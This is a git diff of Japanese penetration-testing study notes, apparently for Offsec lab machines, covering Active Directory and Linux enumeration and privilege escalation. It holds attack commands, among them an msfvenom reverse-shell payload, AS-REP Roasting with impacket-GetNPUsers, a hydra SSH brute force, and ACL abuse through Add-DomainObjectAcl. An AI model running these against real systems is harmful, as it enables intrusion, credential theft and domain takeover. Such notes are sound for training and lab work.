@@ -30,6 +30,8 @@ version
 ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.161.122" "(objectclass=*)"
 sudo nmap -n -sV --script "ldap* and not brute" -p 389 <targetIP> > ldapenum.txt
 ```
+16. 全てのサービスに対するデフォルトクレデンシャルを使ったログインが可能かは常に試す。
+
 
 ## 権限昇格
 1. sudo -lで、パスワードなしでroot権限実行できるコマンドは無いか
@@ -54,7 +56,7 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.13.58.5 LPORT=4444 -f exe-ser
 11. SeImpersonatePrivilegeの権限が有効になっていないか。ただしenabledになっていても、CLSIDsが検索して見つからなければ権限昇格は失敗する可能性が高い。
 12. 自分がアクセスできるユーザが、SIDをコンバートしたときに、ドメイン内でGenericAllのような強力なユーザを持っていないか
 13. ドメイン共有内の古いポリシーファイルの.xmlファイルに、GPP(Group Policy Preference)のパスワードがないか
-14. Kerberos preauthenticationが無効になっているアカウントがドメイン内にないか。それがあれば、Rubeusやimpacket-GetNPUsersを使ってAS-REP Roasting攻撃を使ってユーザのパスワードをクラックできる可能性がある。
+14. Kerberos preauthenticationが無効になっているアカウントがドメイン内にないか。それがあれば、Rubeusやimpacket-GetNPUsersを使ってAS-REP Roasting攻撃を使ってユーザのパスワードをクラックできる可能性がある。preauthenticationが有効になっている場合、DCにリソースへのアクセスを要求したユーザは、パスワードのハッシュで暗号化されたタイムスタンプを含んだAS-REQを送信してDCとの通信を行う。一方preauthenticationが無効になっている場合、ユーザ名のみで攻撃者はDCに認証情報を要求でき、DCはその要求が本人のものであるかを確認せずにチケットを返してしまう。
 ```
 impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
 ```
@@ -152,6 +154,12 @@ Find Computers where Domain Users are Local Admin
 Shortest Path to Domain Admins from Owned Principals
 ```
 
+32. 侵害したユーザアカウントが、EXCHANGE WINDOWS PERMISSIONSグループの中に含まれており、DACL権限をドメイン内で持っていないか。含まれている場合、DACLを書き換えてDCSync等の攻撃が可能になる場合がある。権限を与えるには以下のコマンドをpowerviewから呼び出せる。
+```
+Add-DomainObjectAcl
+```
+33. 侵害したユーザアカウントが、ACCOUNT OPERATORSグループのメンバーに含まれていないか。含まれている場合、GENERIC ALL権限を持つグループ内に新しくユーザを作成する権限がある可能性がある。
+
 ===========
 
 # Linux
@@ -162,13 +170,15 @@ Shortest Path to Domain Admins from Owned Principals
 3. nc -nvでnmapに引っかからなかったサービスの正確なバージョンを特定する
 4. ポート80が動いていたら手動でWebアプリケーションの列挙を行う
 5. snmpが動いていた場合、v1ならコミュニティ文字列publicを使って書き込みからRCEができないか
+snmpwakl
 6. sshの認証系がすべてダメでユーザ名だけわかっている場合、以下のhydraによるブルートフォースでパスワードを破れないか。
 ```
 hydra -l user_name -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.231.142
 ```
 7. .htaccessファイルをアップロードできないか。できる場合、.php等のコードが実行されずソースコードがレンダリングされるだけのシステムにおいて、ファイルを動的にスクリプトとして実行させることができるようになる。これによってファイルアップロード時の拡張子制限をバイパスできる。
-8. snmpのスキャンは時間がかかるのでかなり待つ。リダイレクトした出力は、homeやusr、id_rsaなどで検索をかけて探すとパスワードの取得につながることがある。
-
+8. snmpのスキャンは時間がかかるのでかなり待つ。リダイレクトした出力は、homeやusr、id_rsaなどで検索をかけて探すとパスワードやユーザ名の取得につながることがある。
+9. 全てのサービスに対するデフォルトクレデンシャルを使ったログインが可能かは常に試す。
+10. ssh -i ./id_rsaでログインする際、chmodで鍵に与えた権限は適切か。秘密鍵使うときは600(rootにread write)や400(rootにread)にしておく。秘密鍵は他人(所有者以外のグループ、ユーザ)がアクセスできないようにしておく必要がある。
 
 ## 権限昇格
 1. /home/user配下に.bash_historyがないか、また、その中に認証情報等が平文で書かれていないか
